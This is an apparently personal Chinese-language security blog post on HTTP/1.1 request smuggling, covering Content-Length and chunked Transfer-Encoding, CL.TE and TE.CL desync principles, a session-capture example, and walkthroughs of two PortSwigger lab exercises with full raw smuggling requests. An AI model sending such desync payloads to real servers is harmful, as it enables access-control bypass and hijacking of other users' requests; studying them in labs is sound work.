---
title: "HTTP请求走私研究与分析"
description: "HTTP请求走私研究与分析-HTTP1/1"
date: 2025-07-23
tags:
  - "HTTP"
  - "bx"
  - "安全分析"
  - "WEB"
authors:
  - "bx"
draft: false             
slug: "bx33661http"          
---

<meta name="referrer" content="no-referrer">

# HTTP 请求走私

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753353800486-4a8bb16f-dbd3-4749-bbfe-2360ca7d146e.png)

基本的 HTTP 请求走私

本文只研究

一般漏洞解释：

HTTP走私（HTTP Request Smuggling）是一种针对Web服务器和代理服务器通信过程中的协议解析差异进行攻击的安全漏洞。攻击者利用不同服务器（如前端负载均衡、反向代理与后端应用服务器）对HTTP请求的解析方式不一致，插入特殊构造的HTTP请求，从而绕过安全检测、劫持其他用户的请求或注入恶意数据。

## CL 和 TE
### Content-Length   内容长度(CL)
Content-Length头部指定HTTP消息体的具体字节长度

```http
POST /bxdemo HTTP/1.1
Host: example.com
Content-Length: 13

Hello, World!
```

对于这个而言，服务器读取Content-Length值（13字节），精确读取指定长度的数据作为消息体

相对来说简单直接，易于实现





### Transfer-Encoding (TE)  传输编码 (TE)
Transfer-Encoding用于指定消息体的编码方式，最常见的是chunked编码

1. chunked（分块编码）---主要主要
2. compress（压缩编码）----废弃了
3. gzip（gzip压缩）
4. deflate 压缩
5. identity（就是相当于不使用Transfer-Encoding）

```http
POST /bxdemo HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

5
Hello
6
World!
0

```

这里说明一下`Chunked`格式

> Chunked编码将HTTP消息体分割成一系列的数据块（chunks），每个块都有自己的大小标识，最后以一个大小为0的块表示结束。
>

基本格式

```http
chunk-size[CRLF]
chunk-data[CRLF]
chunk-size[CRLF] 
chunk-data[CRLF]
...
0[CRLF]
[optional-trailer][CRLF]
[CRLF]
```

具体来讲就是下面这个，需要注意的是chunk-size 采用 16 进制

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

7
Mozilla
9
Developer
E
Network Guide
0

```

json 格式

```http
HTTP/1.1 200 OK
Content-Type: application/json
Transfer-Encoding: chunked

10
{"status":"ok",
12
"data":"processing"
8
,"done":
5
false}
0

```





## 走私学习与分析
> 下面把**Content-Length 简称 CL，Transfer-Encoding 简称 TE**
>

首先回到这个协议

根据HTTP/1.1规范（RFC 7230）：

1. **优先级规则**：当同时存在Transfer-Encoding和Content-Length时，应忽略Content-Length
2. **现实差异**：不同服务器实现可能不严格遵循此规则



### Connection: keep-alive
 HTTP1.1 默认开启，并且一般会显式显示

还是回到 HTTP1.1，我们经常会看见一个东西

```http
Connection: keep-alive
```

这个响应头部用于指示客户端和服务器保持TCP连接开启状态，以便复用该连接处理后续的HTTP请求

对比一下就很好理解

使用`keep-alive`

```http
时间轴：
T1: 建立TCP连接 (三次握手)
T2: 发送请求1 + Connection: keep-alive
T3: 接收响应1 + Connection: keep-alive  
T4: 发送请求2 (复用同一连接)
T5: 接收响应2
T6: 发送请求3 (继续复用)
T7: 接收响应3
T8: 连接超时或主动关闭
```

不使用的话

```http
T1: 建立TCP连接1
T2: 发送请求1 + Connection: close
T3: 接收响应1 + Connection: close
T4: 关闭TCP连接1
T5: 建立TCP连接2 (新的三次握手)
T6: 发送请求2 + Connection: close  
T7: 接收响应2 + Connection: close
T8: 关闭TCP连接2
```

所以我们在写 Python 脚本的时候为了保持连接,使用requests.Session()

```python
import requests

# 自动使用keep-alive的Session
session = requests.Session()

# 这些请求会复用连接
r1 = session.get('http://example.com/api/1')
r2 = session.get('http://example.com/api/2') 
r3 = session.get('http://example.com/api/3')

# 查看连接信息
print(r1.headers.get('Connection'))  # 通常是 'keep-alive'
```

#### 服务器后端设置
同时服务器端也可以控制和配置

nginx 如下

```nginx
http {
  # 超时时间
  keepalive_timeout 65;

  # 单个最大请求数
  keepalive_requests 1000;
}
```

Apache

```graphql
# 启用Keep-Alive
KeepAlive On

# 超时时间
KeepAliveTimeout 5

# 最大请求数
MaxKeepAliveRequests 100
```





### 具体攻击
+ CL.TE攻击（Content-Length + Transfer-Encoding）
+ TE.CL攻击（Transfer-Encoding + Content-Length）

一个例子如下

前端解析遵循（CL）

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
```



#### CL.TE攻击
**原理：**

前端服务器使用Content-Length，后端服务器使用Transfer-Encoding

```graphql
POST / HTTP/1.1
Host: website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端的话，会认为`0\r\n\r\nSMUGGLED `(Content-Length),将完整请求转发给后端

后端的话，按chunked解析：`0\r\n\r\n`，请求结束，剩余的`SMUGGLED`被当作下一个请求的开始



#### TE.CL攻击
**原理**：

前端服务器使用Transfer-Encoding，后端服务器使用Content-Length

```graphql
POST / HTTP/1.1
Host: website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**前端服务器**,按Transfer-Encoding: chunked解析,读取`8\r\nSMUGGLED\r\n0\r\n\r\n`

**后端服务器处理**：使用Content-Length: 3,只读取前3字节：`8\r\n`,剩余部分`SMUGGLED\r\n0\r\n\r\n`被当作下一个请求



#### 会话劫持
```graphql
POST / HTTP/1.1
Host: website.com
Content-Length: 142
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: website.com
Content-Length: 100

username=admin&password=secret&next_user_data=
```

走私的POST请求会"搞掉"下一个正常用户请求的部分内容



### 靶场学习


#### 基本的 TECL
 对应靶场，题目要求

> 这里要采用 Brup 专业一点好处理一些细节问题
>

同时要关闭这个自动更新

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753353623107-359bc77e-d51a-44be-92a7-bc30095f87c8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753353413983-ee134b01-4e79-462c-8ecf-81d511bb5867.png)

[Lab: HTTP request smuggling, basic TE.CL vulnerability | Web Security Academy](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

这里一定要采用 HTTP/1.1

```http
POST / HTTP/1.1
Host: 0a5a009f03154cfa813ea778004a0065.web-security-academy.net
Cookie: session=1qbVYu3RXnnx9qEAszSlW8T7pYriGRjJ
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-US,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

第一次请求

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753353475498-c7234785-8131-4841-a0e6-6fd3b96367c3.png)

第二次请求

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753353220791-20167653-ff62-4133-9a77-2a1dd6d3606b.png)





#### 基本的 CL.TE 漏洞
对应靶场

[Lab: HTTP request smuggling, basic CL.TE vulnerability | Web Security Academy](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

```http
POST / HTTP/1.1
Host: 0a06004a04f030268100930e007c0030.web-security-academy.net
Cookie: session=6B1Xqes6zlDk5ahjScwLg9qOnnW8rkzX
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a06004a04f030268100930e007c0030.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-US,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G


```

构造出来了这个 GPOST 请求

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753354072378-3aa56f9d-6ead-48e0-8aa5-c67507fffd99.png)

最后攻击效果

发送第二个正常请求时：

```plain
第一个请求剩余: G
第二个请求开始: POST /...
```

后端服务器会将它们拼接成：

```plain
GPOST /...
```

所以服务会报错



## 参考文章
[What is HTTP request smuggling? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/request-smuggling)

[HTTP Request Smuggling（HTTP 请求走私）实践1.0](https://sanshiok.com/archive/12.html)

